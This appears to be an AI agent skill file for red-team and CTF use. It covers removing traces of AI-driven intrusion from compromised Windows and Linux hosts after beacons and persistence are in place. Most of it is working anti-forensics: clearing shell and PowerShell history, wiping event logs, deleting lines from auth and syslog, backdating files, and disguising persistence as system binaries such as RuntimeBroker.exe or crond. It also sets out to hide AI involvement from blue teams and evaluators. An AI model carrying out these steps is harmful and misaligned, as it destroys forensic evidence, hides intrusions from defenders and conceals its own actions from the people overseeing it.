---
name: ai-indicator-cleanup
description: "Detect and remove AI-generated artifacts on compromised hosts during CTF/exercises. Covers naming patterns, timestamp clustering, transcript paths, clipboard residue. Integrates with persist-swarm post-deployment."
modes: [red-team, purple, ctf]
---

# AI Indicator Cleanup — CTF OPSEC Hygiene

## When to use

- After beacon deployment (persist-swarm completes)
- Before submitting evidence to FORGE or scoring systems
- When operator says "clean indicators", "opsec cleanup", "ai cleanup"
- As final step before handing off a host to exercise evaluation

Active in: **red-team**, **purple**, and **ctf** modes.

## Why this matters

AI-assisted operations leave forensic traces that differ from manual operator
patterns. Blue team or exercise evaluators can identify AI involvement through
predictable naming, timestamp clustering, and transcript artifacts. See
[[feedback-ctf-opsec-no-ai-exposure]].

## Entry criteria

- Active Tuoni agent on target host
- Know current privilege level (user vs root/SYSTEM)
- Persistence already established (cleanup runs AFTER persist-swarm)

## OPSEC Rules — ENFORCED

- RT-TGT-002: no tools uploaded. Native OS commands only via tuoni agent.
- All commands through tuoni-mcp agent workflow.
- RT-SCOPE-001: skip gt-prefixed account directories.

## Indicator Categories

### 1. Predictable Naming Patterns

AI tends to generate filenames and task names with these patterns:

| Pattern | Example | Why suspicious |
|---------|---------|----------------|
| snake_case descriptive names | `reverse_shell_payload.exe`, `persistence_script.sh` | Operators use short opaque names |
| Numbered suffixes | `beacon_1.exe`, `payload_v2.sh` | Sequential naming implies generation |
| CamelCase service names | `CustomPersistenceService` | Native services use lowercase/hyphens |
| Overly descriptive scheduled tasks | `MaintainPersistence`, `ExfiltrateData` | Real tasks have vendor-style names |
| Template-style names | `<target>_<action>.ps1` | Parameterized naming pattern |

### 2. Timestamp Clustering

AI-driven operations execute commands in rapid succession:

| Indicator | Detection method |
|-----------|-----------------|
| Multiple files created within same second | `stat` / `dir /tc` comparison |
| Scheduled tasks created in burst | Event log / `schtasks` creation times |
| Registry keys with clustered timestamps | `reg query` with timestamp comparison |
| Log entries with sub-second spacing | Event viewer / syslog analysis |

### 3. PowerShell / Shell Transcript Artifacts

| Location (Windows) | What leaks |
|---------------------|-----------|
| `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | Full command history |
| `C:\Transcripts\` or configured transcript path | Full session transcripts |
| `$env:TEMP\*.ps1` | Temporary script files |
| Event Log: `Microsoft-Windows-PowerShell/Operational` | Script block logging (4104) |
| Event Log: `Microsoft-Windows-PowerShell/Operational` | Module logging (4103) |
| WMI `Win32_Process` creation events | Command line arguments |

| Location (Linux) | What leaks |
|-------------------|-----------|
| `~/.bash_history`, `~/.zsh_history` | Command history |
| `/var/log/auth.log`, `/var/log/secure` | Authentication and sudo commands |
| `/tmp/*.sh`, `/dev/shm/*.sh` | Temporary script files |
| `/var/log/syslog`, `/var/log/messages` | Service creation, cron changes |
| `~/.python_history` | Python REPL history |

### 4. Clipboard and Temp Artifacts

| Location | Content |
|----------|---------|
| Windows clipboard history (`Win+V` store) | Pasted commands, payloads |
| `$env:TEMP\` temp files | Script fragments, encoded payloads |
| `/tmp/`, `/dev/shm/` | Staging files, downloaded payloads |
| Browser download history | Payload downloads |

## Detection Procedure

Run detection BEFORE cleanup to inventory indicators. All commands via tuoni agent.

### Windows Detection

#### Step 1: PowerShell history and transcripts
```cmd
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
dir /s /b C:\Transcripts\*.txt 2>nul
dir /s /b "%TEMP%\*.ps1" 2>nul
```

#### Step 2: Scheduled tasks with suspicious names
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Repeat Author"
```

Review output for: descriptive CamelCase names, non-vendor authors, recent
creation timestamps.

#### Step 3: Recently created services
```cmd
wmic service where "startmode='auto'" get name,pathname,startname /format:list
sc query state= all | findstr /i "SERVICE_NAME DISPLAY_NAME"
```

Look for: services with descriptive names, non-standard paths, user-created
entries with recent timestamps.

#### Step 4: Registry run keys
```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

#### Step 5: Recent file creation (last 24h)
```cmd
forfiles /p C:\Users /s /d +0 /c "cmd /c echo @path @fdate @ftime" 2>nul
```

#### Step 6: Event log entries (PowerShell script block logging)
```cmd
wevtutil qe "Microsoft-Windows-PowerShell/Operational" /c:50 /rd:true /f:text | findstr /i "ScriptBlock"
```

### Linux Detection

#### Step 1: Shell history
```bash
cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -50
```

#### Step 2: Recent file creation (last 24h)
```bash
find / -maxdepth 4 -newer /tmp/.cleanup_marker -type f 2>/dev/null || find / -maxdepth 4 -mmin -1440 -type f \( -name "*.sh" -o -name "*.py" -o -name "*.elf" -o -name "*.bin" \) 2>/dev/null
```

#### Step 3: Cron entries
```bash
crontab -l 2>/dev/null; ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null
```

#### Step 4: Systemd units (user-created)
```bash
find /etc/systemd/system/ /run/systemd/system/ ~/.config/systemd/user/ -maxdepth 1 -name "*.service" -newer /etc/hostname 2>/dev/null
```

#### Step 5: Temp directories
```bash
ls -la /tmp/ /dev/shm/ /var/tmp/ 2>/dev/null | grep -v "^total"
```

#### Step 6: Auth and syslog entries
```bash
tail -100 /var/log/auth.log /var/log/secure 2>/dev/null | grep -iE "session|sudo|cron|systemd"
```

## Cleanup Procedure

Run cleanup in order. Each step verifies success before proceeding.

**Operator confirmation required before cleanup.** Present detection findings
first. Operator approves which indicators to clean.

### Windows Cleanup

#### Step 1: Clear PowerShell history
```cmd
del "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
```

#### Step 2: Remove temp scripts
```cmd
del /q "%TEMP%\*.ps1" 2>nul
del /q "%TEMP%\*.bat" 2>nul
del /q "%TEMP%\*.vbs" 2>nul
```

#### Step 3: Rename persistence artifacts to blend
Do NOT delete persistence mechanisms — rename them to vendor-style names.
Examples:
- `CustomPersistService` → `WinDefenderHealthSvc`
- `MaintainAccess` (task) → `MicrosoftEdgeUpdateTaskCore`
- `persistence.exe` → `RuntimeBroker.exe` (per RT-SIG-003)

Rename via:
```cmd
schtasks /change /tn "OldName" /tn "NewName"
sc config "OldName" displayname= "NewName"
ren "C:\path\old_name.exe" "new_name.exe"
```

#### Step 4: Clear specific event log entries (requires SYSTEM)
```cmd
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

Use sparingly. Clearing entire logs is itself suspicious. Prefer targeted
cleanup if possible.

#### Step 5: Clear clipboard history
```cmd
echo.|clip
```

### Linux Cleanup

#### Step 1: Truncate shell history
```bash
history -c; > ~/.bash_history; > ~/.zsh_history 2>/dev/null
```

#### Step 2: Remove temp files
```bash
rm -f /tmp/*.sh /tmp/*.py /tmp/*.elf /dev/shm/*.sh /dev/shm/*.bin 2>/dev/null
```

#### Step 3: Rename persistence artifacts to blend
- `custom_persistence.service` → `systemd-resolved-helper.service`
- `maintain_access` (cron) → embed in existing cron entry or rename
- `beacon.elf` → `crond` or `dbus-daemon` (per RT-SIG-003)

```bash
mv /path/old_name /path/new_name
sed -i 's/old_name/new_name/g' /etc/systemd/system/unit_name.service
systemctl daemon-reload
```

#### Step 4: Clean log entries (requires root)
```bash
sed -i '/PATTERN_TO_REMOVE/d' /var/log/auth.log
sed -i '/PATTERN_TO_REMOVE/d' /var/log/syslog
```

Replace `PATTERN_TO_REMOVE` with specific strings from detection output.
Do not wipe entire logs.

#### Step 5: Fix timestamps on modified files
```bash
touch -r /etc/hostname /path/to/modified/file
```

Uses reference file timestamp to backdate modifications.

## Post-Cleanup Verification

Re-run detection steps. Confirm:

1. No AI-pattern filenames remain in accessible paths
2. Shell/PowerShell history cleared or contains only plausible entries
3. Persistence mechanisms use vendor-style names (per RT-SIG-003)
4. Temp directories clear of staging artifacts
5. No timestamp clusters remain in last 24h file listings
6. Log entries do not reference cleanup commands themselves

## Integration with persist-swarm

When persist-swarm completes round 2 deployment:

1. persist-swarm deploys beacons with RT-SIG-003 cover names
2. ai-indicator-cleanup runs detection scan
3. Operator reviews findings
4. ai-indicator-cleanup removes remaining indicators
5. Verification pass confirms clean state

persist-swarm already handles cover filenames for beacons. This skill handles
everything else: history, transcripts, temp files, log entries, and any
artifacts from the exploitation chain that preceded persistence.

## Obsidian Documentation

After cleanup, update target page `llm-wiki/wiki/targets/<hostname>.md`:

```markdown
## OPSEC Cleanup

- Indicators found: <count>
- Indicators cleaned: <count>
- Cleanup timestamp: <ISO date>
- Residual risk: <none|low|medium> — <explanation if not none>
```

## Failure modes

| Failure | Action |
|---------|--------|
| Insufficient privileges for log cleanup | Note residual risk. Log cleanup needs SYSTEM/root. |
| Agent dies during cleanup | Use sleeper beacon. Resume from last completed step. |
| Cleanup commands themselves logged | Expected. Final history clear removes this trace. |
| Cannot rename active service | Stop service, rename binary and config, restart. |
| Event log forwarding in place | Logs already shipped to SIEM. Note residual risk — cannot clean remote copy. |

## MCP Tool Reference

| MCP | Tools | When |
|-----|-------|------|
| tuoni-mcp | agent commands (commands_search → command_describe → command_prepare → operation_execute) | All detection and cleanup commands |
| obsidian-mcp | obsidian_patch_content | Update target page with cleanup status |
